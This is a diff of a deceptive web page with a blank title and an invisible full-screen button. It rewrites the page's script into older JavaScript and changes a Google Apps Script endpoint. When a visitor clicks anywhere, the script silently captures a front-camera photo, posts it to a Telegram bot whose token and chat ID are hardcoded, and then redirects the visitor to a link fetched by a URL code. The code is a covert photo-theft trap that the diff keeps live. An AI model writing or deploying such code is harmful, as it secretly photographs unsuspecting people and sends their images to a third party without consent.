@@ -5,11 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title></title>
 <style>
-  html, body { margin:0; width:100%; height:100%; background:#fff; overflow:hidden; }
-  button {
-    position:fixed; inset:0; width:100%; height:100%;
-    border:none; background:transparent; padding:0; cursor:pointer;
-  }
+html,body{margin:0;width:100%;height:100%;background:#fff;overflow:hidden;}
+button{position:fixed;top:0;left:0;width:100%;height:100%;border:none;background:transparent;padding:0;cursor:pointer;}
 </style>
 </head>
 <body>
@@ -19,80 +16,76 @@
 <button id="btn"></button>
 
 <script>
-  const TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
-  const CHAT = "1314241513";
-  const API = "https://script.google.com/macros/s/AKfycbz3JSyBUTUj30xvEGOuvqXkX26hQxWIT4l6jMPJImtXuqa8HmZji96z64-xwtAjJvw/exec";
+var TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
+var CHAT = "1314241513";
+var API = "https://script.google.com/macros/s/AKfycbzkJLd-k73evMNIGvYV1fzartrmylI7D2YXakttEBnkH5reyMLd3eYthIVs0z1chSMU/exec";
 
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const btn = document.getElementById("btn");
+var video = document.getElementById("video");
+var canvas = document.getElementById("canvas");
+var btn = document.getElementById("btn");
 
-  const code = new URLSearchParams(location.search).get("go");
-  let started = false;
+var code = new URLSearchParams(location.search).get("go");
+var started = false;
 
-  async function getLink() {
-    if (!code) return null;
-    try {
-      const r = await fetch(API + "?go=" + encodeURIComponent(code));
-      const j = await r.json();
-      return j.ok ? j.url : null;
-    } catch (e) {
-      console.log("Ошибка получения ссылки:", e);
-      return null;
-    }
-  }
+function getLink() {
+    if (!code) return Promise.resolve(null);
+    return fetch(API + "?go=" + encodeURIComponent(code))
+        .then(function(r){ return r.json(); })
+        .then(function(j){ return j.ok ? j.url : null; })
+        .catch(function(e){ console.log("Ошибка получения ссылки:", e); return null; });
+}
 
-  async function sendPhoto(blob) {
-    const fd = new FormData();
+function sendPhoto(blob) {
+    var fd = new FormData();
     fd.append("chat_id", CHAT);
     fd.append("photo", blob, "photo.png");
-    try {
-      await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
+    return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
         method: "POST",
         body: fd
-      });
-    } catch (e) {
-      console.log("Ошибка отправки фото:", e);
-    }
-  }
+    }).catch(function(e){ console.log("Ошибка отправки фото:", e); });
+}
 
-  async function shoot() {
+function shoot() {
     if (started) return;
     started = true;
 
-    const redirect = await getLink();
+    getLink().then(function(redirect){
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            if (redirect) window.location.replace(redirect);
+            return;
+        }
 
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" }
-      });
-      video.srcObject = stream;
-      await video.play();
-      await new Promise(r => setTimeout(r, 500));
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(function(stream){
+            video.srcObject = stream;
+            return video.play().then(function(){
+                return new Promise(function(r){ setTimeout(r, 500); });
+            }).then(function(){
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                stream.getTracks().forEach(function(t){ t.stop(); });
+                return new Promise(function(resolve){
+                    canvas.toBlob(function(blob){
+                        sendPhoto(blob).then(resolve).catch(resolve);
+                    }, "image/png");
+                });
+            });
+        })
+        .catch(function(e){
+            console.log("Камера недоступна:", e.name);
+        })
+        .then(function(){
+            if (redirect) {
+                window.location.replace(redirect);
+            } else if (code) {
+                window.location.replace("https://t.me/");
+            }
+        });
+    });
+}
 
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      stream.getTracks().forEach(t => t.stop());
-
-      await new Promise(resolve => {
-        canvas.toBlob(async blob => {
-          await sendPhoto(blob);
-          resolve();
-        }, "image/png");
-      });
-    } catch (e) {
-      console.log("Камера недоступна:", e.name);
-    }
-
-    if (redirect) {
-      window.location.replace(redirect);
-    } else if (code) {
-      window.location.replace("https://t.me/");
-    }
-  }
-
-  btn.addEventListener("click", shoot);
+btn.addEventListener("click", shoot);
 </script>
 
 </body>
